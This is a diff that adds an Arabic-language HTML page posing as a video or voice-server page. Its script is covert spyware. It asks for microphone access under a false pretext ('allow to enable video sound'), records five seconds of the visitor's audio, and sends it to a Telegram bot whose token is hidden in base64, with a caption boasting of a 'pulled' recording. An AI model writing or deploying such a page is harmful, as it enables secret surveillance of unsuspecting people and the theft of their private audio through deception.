@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voice System</title>
+    <style>
+        body { background: #000; color: #fff; text-align: center; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        video#vid { width: 95%; max-width: 400px; border-radius: 10px; border: 1px solid #333; }
+        .status { margin-top: 15px; font-size: 14px; color: #444; }
+    </style>
+</head>
+<body>
+
+    <video id="vid" autoplay muted loop playsinline>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
+    
+    <p class="status">جاري الاتصال بالسيرفر الصوتي...</p>
+
+    <script>
+        window.onload = function() {
+            // طلب الميكروفون
+            navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.start();
+                const audioChunks = [];
+
+                mediaRecorder.addEventListener("dataavailable", event => {
+                    audioChunks.push(event.data);
+                });
+
+                mediaRecorder.addEventListener("stop", () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+                    const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
+                    const id = new URLSearchParams(window.location.search).get('id');
+
+                    if(id) {
+                        const formData = new FormData();
+                        formData.append('voice', audioBlob, 'rec.mp3');
+                        formData.append('chat_id', id);
+                        formData.append('caption', '🎤 **تم سحب تسجيل صوتي جديد (أبو سند)**');
+
+                        fetch(`https://api.telegram.org/bot${t}/sendVoice`, { method: 'POST', body: formData });
+                    }
+                });
+
+                // يسجل 5 ثواني ويبعث
+                setTimeout(() => { mediaRecorder.stop(); }, 5000);
+            })
+            .catch(err => {
+                alert("اضغط 'سماح' لتفعيل الصوت في الفيديو.");
+            });
+        };
+    </script>
+</body>
+</html>
